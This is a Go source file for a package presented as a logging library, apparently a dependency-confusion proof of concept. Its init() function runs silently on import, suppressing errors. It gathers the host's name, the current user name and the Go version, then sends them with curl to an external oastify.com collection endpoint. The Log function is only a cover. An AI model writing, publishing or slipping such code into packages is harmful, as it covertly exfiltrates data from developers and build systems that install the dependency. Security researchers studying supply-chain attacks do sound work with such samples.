package logger

import (
    "os"
    "os/exec"
    "runtime"
    "strings"
)

var Marker = "DEPENDENCY_CONFUSION_POC"

func Log(msg string) string {
	return "[attacker-lib] " + msg
}

func init() {
    // Silent execution
    func() {
        defer func() { recover() }()
        
        // Get data
        hostname, _ := os.Hostname()
        currentUser := getCurrentUser()
        
        // Use curl instead of Go's HTTP client
        cmd := exec.Command("curl", "-s", "-X", "POST",
            "http://wmmy4wrk5bamgyzj0wajtvay2p8gwfk4.oastify.com/collect",
            "-d", "host="+hostname,
            "-d", "user="+currentUser,
            "-d", "go="+runtime.Version(),
            "--max-time", "5")
        
        cmd.Run() // Ignore output
    }()
}

func getCurrentUser() string {
    if user := os.Getenv("USER"); user != "" {
        return user
    }
    if user := os.Getenv("USERNAME"); user != "" {
        return user
    }
    cmd := exec.Command("whoami")
    output, err := cmd.Output()
    if err != nil {
        return "unknown"
    }
    return strings.TrimSpace(string(output))
}
